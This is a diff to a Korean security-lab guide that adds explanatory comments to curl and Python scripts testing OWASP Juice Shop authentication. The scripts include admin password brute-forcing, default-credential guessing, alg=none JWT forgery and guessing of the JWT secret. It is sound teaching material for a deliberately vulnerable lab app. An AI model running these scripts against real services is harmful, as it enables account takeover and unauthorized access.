@@ -132,7 +132,7 @@
 # JuiceShop 회원가입 API
 curl -X POST http://10.20.30.80:3000/api/Users/ \
   -H "Content-Type: application/json" \
-  -d '{
+  -d '{                                                # 요청 데이터(body)
     "email": "student@test.com",
     "password": "Test1234!",
     "passwordRepeat": "Test1234!",
@@ -149,12 +149,12 @@ curl -X POST http://10.20.30.80:3000/api/Users/ \
 # 로그인 요청
 curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -m json.tool
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -m json.tool  # 요청 데이터(body)
 
 # 응답에서 토큰 추출
 TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")  # 요청 데이터(body)
 
 echo "토큰: $TOKEN"
 ```
@@ -164,11 +164,11 @@ echo "토큰: $TOKEN"
 ```bash
 # 토큰을 이용한 인증된 API 호출
 curl -s http://10.20.30.80:3000/rest/user/whoami \
-  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
+  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool  # 인증 토큰
 
 # 장바구니 조회
 curl -s http://10.20.30.80:3000/rest/basket/1 \
-  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
+  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool  # 인증 토큰
 ```
 
 ---
@@ -190,19 +190,19 @@ curl -s http://10.20.30.80:3000/rest/basket/1 \
 # 테스트 1: 매우 짧은 비밀번호
 curl -s -X POST http://10.20.30.80:3000/api/Users/ \
   -H "Content-Type: application/json" \
-  -d '{"email":"weak1@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1},"securityAnswer":"a"}'
+  -d '{"email":"weak1@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1},"securityAnswer":"a"}'  # 요청 데이터(body)
 echo ""
 
 # 테스트 2: 숫자만으로 구성
 curl -s -X POST http://10.20.30.80:3000/api/Users/ \
   -H "Content-Type: application/json" \
-  -d '{"email":"weak2@test.com","password":"12345","passwordRepeat":"12345","securityQuestion":{"id":1},"securityAnswer":"a"}'
+  -d '{"email":"weak2@test.com","password":"12345","passwordRepeat":"12345","securityQuestion":{"id":1},"securityAnswer":"a"}'  # 요청 데이터(body)
 echo ""
 
 # 테스트 3: 흔한 비밀번호
 curl -s -X POST http://10.20.30.80:3000/api/Users/ \
   -H "Content-Type: application/json" \
-  -d '{"email":"weak3@test.com","password":"password","passwordRepeat":"password","securityQuestion":{"id":1},"securityAnswer":"a"}'
+  -d '{"email":"weak3@test.com","password":"password","passwordRepeat":"password","securityQuestion":{"id":1},"securityAnswer":"a"}'  # 요청 데이터(body)
 echo ""
 
 # 결과 분석: 가입이 성공하면 비밀번호 정책이 약한 것
@@ -210,12 +210,14 @@ echo ""
 
 ### 3.3 무차별 대입 공격 (Brute Force) 테스트
 
+반복문으로 여러 대상에 대해 일괄 작업을 수행합니다.
+
 ```bash
 # 로그인 실패 반복 시 잠금 여부 확인
-for i in $(seq 1 10); do
+for i in $(seq 1 10); do                               # 반복문 시작
   result=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.20.30.80:3000/rest/user/login \
     -H "Content-Type: application/json" \
-    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')
+    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')  # 요청 데이터(body)
   echo "시도 $i: HTTP $result"
 done
 
@@ -225,13 +227,15 @@ done
 
 ### 3.4 기본 계정 점검
 
+반복문으로 여러 대상에 대해 일괄 작업을 수행합니다.
+
 ```bash
 # JuiceShop 기본 관리자 계정으로 로그인 시도
 # admin@juice-sh.op + 흔한 비밀번호
-for pw in "admin" "admin123" "password" "admin1234" "juice" "12345678"; do
+for pw in "admin" "admin123" "password" "admin1234" "juice" "12345678"; do  # 반복문 시작
   result=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
     -H "Content-Type: application/json" \
-    -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}")
+    -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}")  # 요청 데이터(body)
   if echo "$result" | grep -q "token"; then
     echo "[성공!] admin@juice-sh.op / $pw"
     break
@@ -257,12 +261,14 @@ done
 
 ### 4.2 세션 ID 랜덤성 확인
 
+반복문으로 여러 대상에 대해 일괄 작업을 수행합니다.
+
 ```bash
 # JuiceShop는 JWT 사용 → 여러 번 로그인하여 토큰 비교
-for i in 1 2 3; do
+for i in 1 2 3; do                                     # 반복문 시작
   token=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
     -H "Content-Type: application/json" \
-    -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+    -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
   echo "토큰 $i: ${token:0:50}..."
 done
 
@@ -300,18 +306,18 @@ curl -s http://10.20.30.80:3000/rest/user/whoami \
 # 동일 계정으로 두 개의 세션 생성
 TOKEN1=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
 
 TOKEN2=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
 
 # 두 토큰 모두 유효한지 확인
 echo "토큰1 유효:"
-curl -s http://10.20.30.80:3000/rest/user/whoami -H "Authorization: Bearer $TOKEN1" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('email','실패'))" 2>/dev/null
+curl -s http://10.20.30.80:3000/rest/user/whoami -H "Authorization: Bearer $TOKEN1" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('email','실패'))" 2>/dev/null  # silent 모드
 
 echo "토큰2 유효:"
-curl -s http://10.20.30.80:3000/rest/user/whoami -H "Authorization: Bearer $TOKEN2" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('email','실패'))" 2>/dev/null
+curl -s http://10.20.30.80:3000/rest/user/whoami -H "Authorization: Bearer $TOKEN2" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('email','실패'))" 2>/dev/null  # silent 모드
 
 # 둘 다 유효하면 → 다중 로그인 미제어 (점검 결과로 기록)
 ```
@@ -338,7 +344,7 @@ Signature: HMACSHA256(header + "." + payload, secret)
 # 로그인하여 JWT 획득
 TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
 
 # JWT의 각 부분 디코딩 (Base64)
 echo "=== Header ==="
@@ -355,7 +361,7 @@ echo "$TOKEN" | cut -d'.' -f2 | python3 -c "import sys,base64,json; s=sys.stdin.
 
 ```bash
 # alg을 none으로 변경한 JWT 생성
-python3 << 'PYEOF'
+python3 << 'PYEOF'                                     # Python 스크립트 실행
 import base64, json
 
 # Header: alg=none
@@ -387,7 +393,7 @@ PYEOF
 ```bash
 # JWT 서명 키가 약한지 확인 (흔한 키로 시도)
 # 실무에서는 jwt-cracker 같은 도구를 사용
-python3 << 'PYEOF'
+python3 << 'PYEOF'                                     # Python 스크립트 실행
 import hmac, hashlib, base64, json
 
 # JuiceShop에서 획득한 토큰의 header.payload 부분
@@ -407,7 +413,7 @@ try:
     # 흔한 시크릿 키로 서명 검증 시도
     common_secrets = ["secret", "jwt_secret", "password", "key", "123456",
                       "your-256-bit-secret", "change-me"]
-    for secret in common_secrets:
+    for secret in common_secrets:                      # 반복문 시작
         computed = base64.urlsafe_b64encode(
             hmac.new(secret.encode(), data.encode(), hashlib.sha256).digest()
         ).rstrip(b'=').decode()
@@ -427,7 +433,7 @@ PYEOF
 # JWT payload의 exp (만료시간) 확인
 TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
 
 echo "$TOKEN" | cut -d'.' -f2 | python3 -c "
 import sys, base64, json
